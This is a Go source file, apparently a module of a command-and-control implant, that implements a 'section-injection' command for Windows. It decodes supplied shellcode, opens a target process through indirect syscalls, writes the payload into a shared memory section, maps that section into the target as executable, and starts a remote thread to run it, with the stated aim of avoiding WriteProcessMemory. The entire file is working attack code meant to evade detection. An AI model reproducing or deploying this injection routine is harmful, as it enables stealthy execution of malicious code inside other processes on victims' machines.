//go:build windows
// +build windows

package commands

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"strings"
	"syscall"
	"unsafe"

	"killa/pkg/structs"

	"golang.org/x/sys/windows"
)

// SectionInjectionCommand implements the section-injection command
type SectionInjectionCommand struct{}

func (c *SectionInjectionCommand) Name() string {
	return "section-injection"
}

func (c *SectionInjectionCommand) Description() string {
	return "Perform process injection using memory sections (NtCreateSection, NtMapViewOfSection) to avoid WriteProcessMemory"
}

type sectionInjectionParams struct {
	ShellcodeB64 string `json:"shellcode_b64"`
	PID          int    `json:"pid"`
}

func (c *SectionInjectionCommand) Execute(task structs.Task) structs.CommandResult {
	var params sectionInjectionParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return errorf("Error parsing parameters: %v", err)
	}

	shellcode, err := base64.StdEncoding.DecodeString(params.ShellcodeB64)
	if err != nil || len(shellcode) == 0 {
		return errorResult("Error: invalid or empty shellcode data")
	}

	if params.PID <= 0 {
		return errorResult("Error: invalid PID specified")
	}

	var sb strings.Builder
	sb.WriteString("[*] Section Memory Injection\n")
	sb.WriteString(fmt.Sprintf("[*] Shellcode: %d bytes\n", len(shellcode)))
	sb.WriteString(fmt.Sprintf("[*] Target PID: %d\n", params.PID))

	if !IndirectSyscallsAvailable() {
		return errorResult("Error: Indirect syscalls are not available, which are required for section injection in this implementation.")
	}

	// Constants for section creation/mapping
	const (
		SECTION_ALL_ACCESS    = 0xF001F
		PAGE_EXECUTE_READ     = 0x20
		PAGE_READWRITE        = 0x04
		PAGE_EXECUTE_READWRITE= 0x40
		SEC_COMMIT            = 0x8000000
		PROCESS_VM_READ       = 0x0010
		PROCESS_VM_WRITE      = 0x0020
		PROCESS_VM_OPERATION  = 0x0008
		PROCESS_CREATE_THREAD = 0x0002
		PROCESS_QUERY_INFO    = 0x0400
	)

	// Step 1: Open target process
	desiredAccess := uint32(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFO | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ)
	var hProcess uintptr
	status := IndirectNtOpenProcess(&hProcess, desiredAccess, uintptr(params.PID))
	if status != 0 {
		return errorResult(fmt.Sprintf("[!] NtOpenProcess failed: NTSTATUS 0x%X", status))
	}
	defer injectCloseHandle(hProcess)
	sb.WriteString("[+] Opened target process handle\n")

	// Step 2: Create a memory section backed by the paging file
	var hSection uintptr
	maxSize := int64(len(shellcode))
	status = IndirectNtCreateSection(&hSection, SECTION_ALL_ACCESS, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, 0)
	if status != 0 {
		return errorResult(fmt.Sprintf("[!] NtCreateSection failed: NTSTATUS 0x%X", status))
	}
	defer injectCloseHandle(hSection)
	sb.WriteString(fmt.Sprintf("[+] Created memory section (size: %d bytes)\n", maxSize))

	// Step 3: Map the section into the current process as Read/Write
	var localBaseAddr uintptr
	var localViewSize uintptr
	currentProcess := ^uintptr(0) // Pseudo-handle for current process
	status = IndirectNtMapViewOfSection(hSection, currentProcess, &localBaseAddr, 0, nil, &localViewSize, 1, 0, PAGE_READWRITE)
	if status != 0 {
		return errorResult(fmt.Sprintf("[!] NtMapViewOfSection (local) failed: NTSTATUS 0x%X", status))
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped section locally as RW at 0x%X\n", localBaseAddr))

	// Step 4: Write shellcode into the local view
	// We can use standard go memory copy since it's mapped in our own process
	copy(unsafe.Slice((*byte)(unsafe.Pointer(localBaseAddr)), len(shellcode)), shellcode)
	sb.WriteString("[+] Copied shellcode into local section view\n")

	// Step 5: Map the section into the remote process as Read/Execute
	var remoteBaseAddr uintptr
	var remoteViewSize uintptr
	status = IndirectNtMapViewOfSection(hSection, hProcess, &remoteBaseAddr, 0, nil, &remoteViewSize, 1, 0, PAGE_EXECUTE_READ)
	if status != 0 {
		IndirectNtUnmapViewOfSection(currentProcess, localBaseAddr)
		return errorResult(fmt.Sprintf("[!] NtMapViewOfSection (remote) failed: NTSTATUS 0x%X", status))
	}
	sb.WriteString(fmt.Sprintf("[+] Mapped section remotely as RX at 0x%X\n", remoteBaseAddr))

	// Unmap the local view since we no longer need to write to it
	status = IndirectNtUnmapViewOfSection(currentProcess, localBaseAddr)
	if status != 0 {
		sb.WriteString(fmt.Sprintf("[-] Warning: Failed to unmap local view: NTSTATUS 0x%X\n", status))
	} else {
		sb.WriteString("[+] Unmapped local section view\n")
	}

	// Step 6: Create a remote thread to execute the shellcode
	var hThread uintptr
	status = IndirectNtCreateThreadEx(&hThread, hProcess, remoteBaseAddr)
	if status != 0 {
		return errorResult(fmt.Sprintf("[!] NtCreateThreadEx failed: NTSTATUS 0x%X\n", status))
	}
	defer injectCloseHandle(hThread)

	sb.WriteString(fmt.Sprintf("[+] Thread created (handle: 0x%X)\n", hThread))
	sb.WriteString("[+] Section injection completed successfully\n")

	return successResult(sb.String())
}
